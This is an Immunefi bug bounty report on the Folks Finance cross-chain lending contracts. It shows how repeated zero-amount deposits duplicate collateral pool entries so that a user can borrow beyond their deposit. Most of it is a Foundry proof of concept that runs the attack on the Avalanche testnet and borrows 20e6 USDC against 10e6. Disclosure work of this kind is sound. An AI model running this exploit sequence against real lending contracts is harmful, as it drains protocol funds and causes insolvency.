# Boost \_ Folks Finance 33695 - \[Smart Contract - Critical] Attacker can borrow more than the collater

Submitted on Fri Jul 26 2024 15:48:54 GMT-0400 (Atlantic Standard Time) by @Shahen for [Boost | Folks Finance](https://immunefi.com/bounty/folksfinance-boost/)

Report ID: #33695

Report type: Smart Contract

Report severity: Critical

Target: <https://testnet.snowtrace.io/address/0x2cAa1315bd676FbecABFC3195000c642f503f1C9>

Impacts:

* Protocol insolvency

## Description

## Brief/Intro

Possibility to borrow more than the deposit amount. Please refer to the below vulnerability details section for the step by step demonstration.

## Vulnerability Details

Issue is explained below in a numbered step-by-step way.

1. Attacker makes two 0 amount deposits by calling `SpokeCircleToken.deposit()`, By making a zero amount deposit will push duplicate pool ids to the list of user loan collaterals because the previous balance is always 0 until a amount greater than 0 is deposited. `(L22 UserLoanLogic.sol)`. So in this situation the pool id will be pushed twice as two zero deposits.
2. Then attacker makes a deposit of `10e6` usdc by calling `SpokeCircleToken.deposit()`
3. Usually when a user calls `SpokeCommon.borrow()` `LoanManagerLogic.executeBorrow()` checks whether the loan is over-collaterised after the borrow by calling `userLoan.isLoanOverCollateralized()`.So this is to prevent from borrowing more then the collateral right. Lets dive into that function. It calls the internal function `getLoanLiquidity()` which has a for loop in L231 which calculates the effective collateral value. Now since the attacker has pushed the same poolId twice by depositing 0\*2 times before the deposit of 10e6, the `colPools.length` will be 3. Therefore the attacker can borrow from a collateral of 30e6 even though he deposited 10e6 initially.
4. This is considered as stealing of funds as the attacker could borrow more than the capital which could lead to protocol insolvency as debts exceeds the assets. I have attached a foundry coded poc that demonstrates bob the attacker depositing `10e6` and end up borrowing `20e6`. Please refer to it. Node rpc is included therefore just RUN `forge test -vvv`.

## Impact Details

Possible to borrow more than the deposit amount.

## References

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L22>

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L283>

<https://github.com/Folks-Finance/folks-finance-xchain-contracts/blob/fb92deccd27359ea4f0cf0bc41394c86448c7abb/contracts/hub/logic/UserLoanLogic.sol#L216>

## Proof of concept

## Proof of Concept

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../lib/forge-std/src/Test.sol";


interface iSpokeCommon {
    function createAccount(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 refAccountId
    ) external payable;

    function addDelegate(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 addr
    ) external payable;

    function inviteAddress(
        MessageParams memory params,
        bytes32 accountId,
        uint16 chainId,
        bytes32 addr,
        bytes32 refAccountId
    ) external payable;

    function createLoan(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId,
        uint16 loanTypeId,
        bytes32 loanName
    ) external payable;

    function deleteLoan(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId
    ) external payable;
    
    function withdraw(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId,
        uint8 poolId,
        uint16 chainId,
        uint256 amount,
        bool isFAmount
    ) external payable;

    function borrow(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId,
        uint8 poolId,
        uint16 chainId,
        uint256 amount,
        uint256 maxStableRate
    ) external payable;

}

interface iBridgeRouter {
    function getSendFee(MessageToSend memory message) external view returns (uint256);
}

interface iAccountManager {
     function isAccountCreated(bytes32 accountId) external view returns (bool);
     function isAddressRegisteredToAccount(
        bytes32 accountId,
        uint16 chainId,
        bytes32 addr
    ) external view returns (bool);
    function getAddressRegisteredToAccountOnChain(
        bytes32 accountId,
        uint16 chainId
    ) external view returns (bytes32);
}

interface iHub {
    function directOperation(Action action, bytes32 accountId, bytes memory data) external;
}

interface iLoanManager {
    function isUserLoanActive(bytes32 loanId) external view returns (bool);
    function isUserLoanOwner(bytes32 loanId, bytes32 accountId) external view returns (bool);
    function getUserLoan(
        bytes32 loanId
    )
        external
        view
        returns (
            bytes32 accountId,
            uint16 loanTypeId,
            uint8[] memory colPools,
            uint8[] memory borPools,
            UserLoanCollateral[] memory,
            UserLoanBorrow[] memory
        );


}

interface iHubPool {
    function getPoolId() external view returns (uint8);
}

interface iSpokeCircleToken {
    function deposit(
        MessageParams memory params,
        bytes32 accountId,
        bytes32 loanId,
        uint256 amount
    ) external payable;
}

interface iUSDC {
    function mint(address _to, uint256 _amount) external returns (bool);
    function configureMinter(address minter, uint256 minterAllowedAmount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}





struct MessageParams {
        uint16 adapterId; 
        uint16 returnAdapterId; 
        uint256 receiverValue; 
        uint256 gasLimit; 
        uint256 returnGasLimit; 
}

struct MessageToSend {
        MessageParams params; 
        bytes32 sender; 
        uint16 destinationChainId; 
        bytes32 handler; 
        bytes payload; 
        uint64 finalityLevel; 
        bytes extraArgs;
}

enum Action {
        
        CreateAccount,
        CreateLoan
}

struct MessagePayload {
        Action action;
        bytes32 accountId;
        bytes32 userAddress;
        bytes data;
}

struct UserLoanCollateral {
        uint256 balance; 
        uint256 rewardIndex;
}

struct UserLoanBorrow {
        uint256 amount; 
        uint256 balance; 
        uint256 lastInterestIndex;
        uint256 stableInterestRate; 
        uint256 lastStableUpdateTimestamp; 
        uint256 rewardIndex;
}



contract Folkstest is Test {

    iSpokeCommon public _SpokeCommon; 
    iBridgeRouter public _BridgeRouter;
    iAccountManager public _AccountManager;
    iLoanManager public _LoanManager;
    iHub public _Hub;
    iHubPool public _HubPool;
    iSpokeCircleToken public _SpokeCircleToken;
    iUSDC public _USDC;
    


    address bob = address(0x1);
    address _USDC_MASTER_MINTER_ROLE = address(0xe3B41Fc3bD92FaE6c8a05A83b234c51FF4c065D5);
    address _USDC_MINTER_ROLE = address(0x3);

    MessageParams _MessageParams = MessageParams(uint16(1),uint16(1),uint16(0),uint256(201817),uint256(0)); 
    

   
    function setUp() public {
        //avalanche-testnet-contract 
        //https://avalanche-fuji.drpc.org (testnet-rpc)
        _SpokeCommon = iSpokeCommon(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00); //SpokeCommon.sol 
        _BridgeRouter = iBridgeRouter(0x0f91d914E058d0588Cc1bf35FA3736A627C3Ba81); 
        _AccountManager = iAccountManager(0x3324B5BF2b5C85999C6DAf2f77b5a29aB74197cc);
        _LoanManager = iLoanManager(0x2cAa1315bd676FbecABFC3195000c642f503f1C9);
        _Hub = iHub(0xaE4C62510F4d930a5C8796dbfB8C4Bc7b9B62140);
        _HubPool = iHubPool(0x1968237f3a7D256D08BcAb212D7ae28fEda72c34); //USDC POOL
        _SpokeCircleToken = iSpokeCircleToken(0x89df7db4af48Ec7A84DE09F755ade9AF1940420b);
        _USDC = iUSDC(0x5425890298aed601595a70AB815c96711a31Bc65);
        

    }

    function _message(bytes32 _accountId, address _useraddress) private returns (MessageToSend memory) {
        MessagePayload memory payload = MessagePayload(Action.CreateAccount,_accountId,bytes32(uint256(uint160(_useraddress))),abi.encodePacked(bytes32(0)));
        MessageToSend memory _message = MessageToSend({
            params: _MessageParams,
            sender: bytes32(uint256(uint160(0x6628cE08b54e9C8358bE94f716D93AdDcca45b00))), 
            destinationChainId: uint16(1),
            handler: bytes32(0x000000000000000000000000ae4c62510f4d930a5c8796dbfb8c4bc7b9b62140), 
            payload: abi.encodePacked(uint16(payload.action), payload.accountId, payload.userAddress, payload.data),
            finalityLevel: 0, 
            extraArgs: ""
        });

        return _message;
    }
    

    function test_leading_To_borrowing_over_collateralized() public {
        vm.createSelectFork("https://avalanche-fuji.drpc.org");

    //1.Bob creates an account..
        vm.startPrank(bob);
        bytes32 account_id = keccak256(abi.encodePacked("bobacc"));
        uint256 _sendfee_bob = _BridgeRouter.getSendFee(_message(account_id,bob));
        deal(bob,_sendfee_bob*10);
        assertEq(address(bob).balance,_sendfee_bob*10);
        _SpokeCommon.createAccount{value:_sendfee_bob}(_MessageParams,keccak256(abi.encodePacked("bobacc")),bytes32(0));

    //2. Asserting that the account is created and the account is registered to bob...

        bool _isAccountCreated = _AccountManager.isAccountCreated(keccak256(abi.encodePacked("bobacc")));
        assertEq(_isAccountCreated,true);
        bool _isAddressRegisteredToAccount_bob = _AccountManager.isAddressRegisteredToAccount(keccak256(abi.encodePacked("bobacc")),uint16(1),bytes32(uint256(uint160(bob))));
        assertEq(_isAddressRegisteredToAccount_bob,true);
    
    //3. Bob creates a loan..

        bytes32 loan_id = keccak256(abi.encodePacked("bobaccloan")); 
        _SpokeCommon.createLoan{value:_sendfee_bob}(_MessageParams,account_id,loan_id,uint16(2),keccak256(abi.encodePacked("bobsloan")));

    //5. Asserting that loan is active and owner is bob.

        bool _isUserLoanActive_bob = _LoanManager.isUserLoanActive(loan_id);
        bool _isUserLoanOwner_bob = _LoanManager.isUserLoanOwner(loan_id,account_id);
        assertEq(_isUserLoanActive_bob,true);
        assertEq(_isUserLoanOwner_bob,true); 
        vm.stopPrank();

    // Minting some USDC to bob
        vm.startPrank(_USDC_MASTER_MINTER_ROLE);
        _USDC.configureMinter(_USDC_MINTER_ROLE,100e6);
        vm.stopPrank();
        vm.startPrank(_USDC_MINTER_ROLE);
        _USDC.mint(bob,10e6);
        vm.stopPrank();

// EXPLOIT STARTS BELOW THIS ------------------------------------------------------------------------

    //6. Depositing multiple 0 amounts before a amount > 0.
    //   By depositing multiple 0 amounts before a real value will push duplicate colPools. 
    //   Below shows bob depositing 0 amounts twice then a deposit of 10e6.
        vm.startPrank(bob);
        _USDC.approve(address(_SpokeCircleToken),10e6);
        _SpokeCircleToken.deposit(_MessageParams,account_id,loan_id,0);
        _SpokeCircleToken.deposit(_MessageParams,account_id,loan_id,0);
        _SpokeCircleToken.deposit(_MessageParams,account_id,loan_id,10e6);
        

    //7. Now with a deposit of 10e6 bob borrows 20e6 tokens.
    //   check the console logs.
        console.log("usdc balance before", _USDC.balanceOf(bob)/10**6);
        _SpokeCommon.borrow{value: _sendfee_bob}(_MessageParams,account_id,loan_id,uint8(128),uint16(1),20e6,uint256(0));
        console.log("usdc balance after", _USDC.balanceOf(bob)/10**6);
    

        vm.stopPrank();
    





    }

}
```
